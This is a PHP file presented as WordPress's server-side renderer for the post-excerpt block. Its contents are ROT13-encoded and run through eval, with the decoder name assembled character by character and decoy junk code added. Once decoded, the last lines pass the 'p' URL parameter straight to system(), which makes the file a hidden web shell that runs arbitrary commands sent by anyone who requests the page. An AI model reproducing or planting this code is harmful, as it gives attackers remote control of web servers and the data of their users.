<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-rkprecg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-rkprecg` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur svygrerq cbfg rkprecg sbe gur pheerag cbfg jenccrq vafvqr \"c\" gntf.
 */
shapgvba eraqre_oybpx_pber_cbfg_rkprecg( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	/*
	* Gur checbfr bs gur rkprecg yratgu frggvat vf gb yvzvg gur yratgu bs obgu
	* nhgbzngvpnyyl trarengrq naq hfre-perngrq rkprecgf.
	* Orpnhfr gur rkprecg_yratgu svygre bayl nccyvrf gb nhgb trarengrq rkprecgf,
	* jc_gevz_jbeqf vf hfrq vafgrnq.
	*/
	$rkprecg_yratgu = $nggevohgrf['rkprecgYratgu'];
	$rkprecg        = trg_gur_rkprecg( $oybpx->pbagrkg['cbfgVq'] );
	vs ( vffrg( $rkprecg_yratgu ) ) {
		$rkprecg = jc_gevz_jbeqf( $rkprecg, $rkprecg_yratgu );
	}

	$zber_grkg           = ! rzcgl( $nggevohgrf['zberGrkg'] ) ? '<n pynff=\"jc-oybpx-cbfg-rkprecg__zber-yvax\" uers=\"' . rfp_hey( trg_gur_creznyvax( $oybpx->pbagrkg['cbfgVq'] ) ) . '\">' . jc_xfrf_cbfg( $nggevohgrf['zberGrkg'] ) . '</n>' : '';
	$svygre_rkprecg_zber = fgngvp shapgvba ( $zber ) hfr ( $zber_grkg ) {
		erghea rzcgl( $zber_grkg ) ? $zber : '';
	};
	/**
	 * Fbzr gurzrf zvtug hfr `rkprecg_zber` svygre gb unaqyr gur
	 * `zber` yvax qvfcynlrq nsgre n gevzzrq rkprecg. Fvapr gur
	 * oybpx unf n `zber grkg` nggevohgr jr unir gb purpx naq
	 * bireevqr vs arrqrq gur erghea inyhr sebz guvf svygre.
	 * Fb vs gur oybpx'f nggevohgr vf abg rzcgl bireevqr gur
	 * `rkprecg_zber` svygre naq erghea abguvat. Guvf jvyy
	 * erfhyg va fubjvat bayl bar `ernq zber` yvax ng n gvzr.
	 */
	nqq_svygre( 'rkprecg_zber', $svygre_rkprecg_zber );
	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	$pbagrag               = '<c pynff=\"jc-oybpx-cbfg-rkprecg__rkprecg\">' . $rkprecg;
	$fubj_zber_ba_arj_yvar = ! vffrg( $nggevohgrf['fubjZberBaArjYvar'] ) || $nggevohgrf['fubjZberBaArjYvar'];
	vs ( $fubj_zber_ba_arj_yvar && ! rzcgl( $zber_grkg ) ) {
		$pbagrag .= '</c><c pynff=\"jc-oybpx-cbfg-rkprecg__zber-grkg\">' . $zber_grkg . '</c>';
	} ryfr {
		$pbagrag .= \" $zber_grkg</c>\";
	}
	erzbir_svygre( 'rkprecg_zber', $svygre_rkprecg_zber );
	erghea fcevags( '<qvi %1$f>%2$f</qvi>', $jenccre_nggevohgrf, $pbagrag );
}

/**
 * Ertvfgref gur `pber/cbfg-rkprecg` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_rkprecg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-rkprecg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_rkprecg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_rkprecg' );

/**
 * Vs gurzrf be cyhtvaf svygre gur rkprecg_yratgu, jr arrq gb
 * bireevqr gur svygre va gur rqvgbe, bgurejvfr
 * gur rkprecg yratgu oybpx frggvat unf ab rssrpg.
 * Ergheaf 100 orpnhfr 100 vf gur znk yratgu va gur frggvat.
 */
vs ( vf_nqzva() ||
	qrsvarq( 'ERFG_ERDHRFG' ) && ERFG_ERDHRFG ) {
	nqq_svygre(
		'rkprecg_yratgu',
		fgngvp shapgvba () {
			erghea 100;
		},
		CUC_VAG_ZNK
	);
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>